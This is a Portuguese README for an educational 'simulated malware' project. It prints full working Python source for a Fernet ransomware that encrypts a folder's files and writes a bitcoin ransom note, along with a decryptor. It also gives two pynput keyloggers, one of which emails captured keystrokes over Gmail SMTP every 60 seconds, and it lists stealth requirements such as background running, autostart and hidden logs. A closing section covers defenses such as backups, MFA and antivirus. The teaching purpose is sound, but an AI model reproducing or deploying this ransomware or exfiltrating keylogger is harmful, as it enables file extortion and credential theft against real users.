# Projeto Prático em Python — Simulação de Malware em Ambiente Seguro

## Introdução

Este projeto tem como objetivo **implementar, documentar e compartilhar um estudo prático em Python**, simulando o comportamento de malwares **de forma controlada e segura**, com foco em aprendizado, análise e conscientização sobre ameaças digitais.

A proposta é compreender, na prática, como determinadas técnicas utilizadas por malwares funcionam, permitindo também refletir sobre medidas defensivas e boas práticas de segurança.

> ⚠️ **Importante:** Todas as simulações devem ser realizadas em ambiente isolado, como máquinas virtuais, containers ou sandbox, sem risco de afetar sistemas reais.

---

## Objetivos do Projeto

O projeto foi dividido em três partes principais:

- **Ransomware Simulado**
- **Keylogger Simulado**
- **Reflexão sobre Defesa e Prevenção**

Cada módulo tem o propósito de representar técnicas comuns em ataques reais, mas sempre com fins educacionais e laboratoriais.

---

# 1. Ransomware Simulado

## Descrição do Cenário

O ransomware é um tipo de malware que sequestra arquivos do usuário, criptografando-os e exigindo um pagamento (resgate) para devolvê-los.  
Neste projeto, será implementada uma versão simulada, voltada para aprendizado, utilizando apenas arquivos de teste.

---

## Requisitos do Módulo

O módulo de ransomware simulado deve conter:

### 📌 Criação de Arquivos de Teste
O projeto deve gerar automaticamente arquivos fictícios (por exemplo `.txt`, `.pdf`, `.docx` falsos ou arquivos simples), simulando documentos que seriam alvos de criptografia.

### 🔐 Criptografia dos Arquivos
Implementar um script que percorre uma pasta específica e realiza a criptografia dos arquivos criados, alterando o conteúdo para uma forma ilegível.

### 🔓 Descriptografia dos Arquivos
Criar também a função reversa, capaz de descriptografar os arquivos e restaurar seu conteúdo original, simulando a recuperação após "pagamento".

### 💬 Mensagem de Resgate
Gerar automaticamente um arquivo (ex: `README_RESGATE.txt`) contendo uma mensagem típica de ransomware, informando que os arquivos foram bloqueados e instruções simuladas para recuperação.

### Segue um exemplo de um Ransomware o codigo é do Cassiano da DIO https://github.com/cassiano-dio/cibersecurity-desafio-ransomware. Inclusive no Github dele tem muito material bom para estudos.

Porem o codigo que vamos usar está no diretório MALWARE:

Ele é composto de dois scripts:

**descriptografar.py**: responsável por descriptografar os arquivos atacados.

from cryptography.fernet import Fernet
import os

def carregar_chave():
    return open("chave.key", "rb").read()

def descriptografar_arquivo(arquivo,chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
        dados_descriptografados = f.decrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_descriptografados)

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista 

def main():
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        descriptografar_arquivo(arquivo, chave)
    print("Arquivos restaurados com sucesso")

if __name__ == "__main__":
    main()


**ransonware.py**: responsável por criptografar os arquivos e deixar a mensagem de resgate.

from cryptography.fernet import Fernet
import os

#1. Gerar uma chave de criptografia e salvar
def gerar_chave():
    chave = Fernet.generate_key() 
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

#2. Carregar a chave salva
def carregar_chave():
    return open("chave.key", "rb").read()

#3. Criptografar um único arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

#4. Encontrar arquivos para criptografar 
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista 

#5. Mensagem de resgate
def criar_mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envia 1 bitcoin para o endereço X e envie o comprovante!\n")
        f.write("Depois disso, enviaremos a chave para você recuperar seus dados!\n")

#6. Execução principal
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransoware executado! Arquivos criptografos!")

if __name__=="__main__":
    main()



**chave.key**: chave para descriptografar os arquivos.

### LEMBRANDO USE COM CUIDADO E EM AMBIENTE SEPARADO, ESSE DOCUMENTO TEM COMO OBJETIVO DIDÁTICO. 

---

## Resultado Esperado

Ao executar o ransomware simulado:

- arquivos serão criados automaticamente;
- os arquivos serão criptografados;
- será exibida ou gerada uma mensagem de resgate;
- um segundo script ou função permitirá descriptografar os arquivos.

---

# 2. Keylogger Simulado

## Descrição do Cenário

Keyloggers são programas capazes de registrar teclas digitadas pelo usuário, geralmente com intenção de roubar credenciais, senhas ou informações sensíveis.  
Neste projeto, será implementada uma versão simulada, com fins acadêmicos e controlados.

---

## Requisitos do Módulo

O keylogger simulado deve conter:

### ⌨️ Captura de Teclas em Arquivo `.txt`
O sistema deve registrar todas as teclas digitadas e salvar em um arquivo de log, como por exemplo:

- `log_teclas.txt`

### 🕵️ Tornar o Programa Mais Furtivo
Implementar melhorias que simulem comportamento furtivo, como:

- rodar em segundo plano;
- minimizar saída no terminal;
- iniciar automaticamente em execução (somente no laboratório);
- ocultar o arquivo de log ou armazenar em diretórios específicos.

> ⚠️ Este item deve ser tratado com responsabilidade e sempre em ambiente isolado.

### 📧 Envio Automático por E-mail
O keylogger deve possuir funcionalidade para envio automático do arquivo de log por e-mail, simulando exfiltração de dados.

Isso pode incluir:

- configuração de SMTP;
- envio periódico;
- envio ao atingir um tamanho específico do arquivo.

### O Keylogger é composto por dois arquivos

Os arquivos estão no diretorio Keylogger, são dois exemplos.


**keylogger.pyw**: Esse script somente captura as teclas e salva em um arquivo .txt.

from pynput import keyboard 

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

def on_press(key):
    try: 
        # se for uma tecla "normal" (letra, número, símboolo)
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)

    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass 
            else:
                f.write(f"[{key}] ")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()


**keylogger_email.py**: Esse captura as teclas gera o .txt e envia por e-mail.

from pynput import keyboard 
import smtplib
from email.mime.text import MIMEText
from threading import Timer 

log = ""

#CONFIGURAÇÕES DE E-MAIL 
EMAIL_ORIGEM = "contateste@gmail.com"
EMAIL_DESTINO= "contateste@gmail.com"
SENHA_EMAIL = "alguma senha forte"

def enviar_email():
    global log 
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To']= EMAIL_DESTINO 
        
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)
    
        log = ""

    # Agendar o envio a cada 60 segundos
    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log+= key.char 
    except AttributeError:
        if key == keyboard.Key.space:
            log +=" "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif keyboard.Key.backspace:
            log+="[<]"
        else:
            pass # Ignorar control, shift, etc...

# Inicia o keylogger e o envio automático
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()
    
    

---

## Resultado Esperado

Ao executar o keylogger simulado:

- as teclas digitadas serão registradas;
- o arquivo de log será atualizado continuamente;
- o conteúdo poderá ser enviado automaticamente por e-mail conforme configuração.

---

# 3. Reflexão sobre Defesa e Prevenção

## Objetivo

Além da implementação prática, este projeto exige uma reflexão sobre como proteger sistemas contra esse tipo de ameaça.  
A ideia é entender não apenas o ataque, mas principalmente a defesa.

---

## Medidas de Defesa Contra Ransomware

Algumas práticas essenciais incluem:

### 🛡️ Antivírus e Antimalware Atualizados
Soluções de segurança modernas detectam comportamentos suspeitos, como criptografia em massa de arquivos.

### 🔥 Firewall e Controle de Rede
Bloquear conexões não autorizadas pode impedir comunicação do malware com servidores externos.

### 💾 Backups Frequentes e Offline
A defesa mais eficaz contra ransomware é possuir backups atualizados, preferencialmente:

- backups em nuvem com versionamento;
- backups offline (HD externo desconectado).

### 🔒 Controle de Permissões
Restringir permissões de escrita em diretórios críticos reduz impacto do ataque.

---

## Medidas de Defesa Contra Keyloggers

### 🔍 Monitoramento de Processos Suspeitos
Ferramentas de análise podem identificar processos em execução que capturam entradas do teclado.

### 🧱 Sandboxing e Ambientes Isolados
Executar softwares desconhecidos em sandbox impede que programas afetem o sistema real.

### 🔑 Autenticação Multifator (MFA)
Mesmo que senhas sejam capturadas, o MFA pode impedir invasões.

### 🚫 Bloqueio de Scripts Não Autorizados
Políticas de execução e bloqueio de scripts podem evitar a execução de programas maliciosos.

---

## Conscientização do Usuário

Um dos fatores mais importantes em segurança é o comportamento humano.

Boas práticas incluem:

- evitar clicar em links suspeitos;
- desconfiar de anexos em e-mails;
- validar fontes de downloads;
- manter sistemas atualizados;
- compreender engenharia social.

---

# Considerações Finais

## Flexibilidade do Desafio

Este desafio permite diferentes níveis de entrega:

- implementação completa dos módulos (ransomware + keylogger);
- documentação detalhada e estudo teórico;
- adaptação do código para novos cenários;
- melhorias e simulações adicionais.

O principal objetivo é demonstrar **entendimento prático e teórico**, além de apresentar uma jornada de aprendizado consistente na área de segurança.

---

## Conclusão

Este projeto proporciona uma experiência realista sobre como malwares operam, reforçando a importância de:

- ambientes controlados de teste;
- práticas seguras de programação;
- defesa em camadas;
- conscientização e prevenção.

Ao simular ataques, torna-se mais claro como proteger sistemas e usuários, promovendo uma postura mais responsável e preventiva frente às ameaças digitais.

---
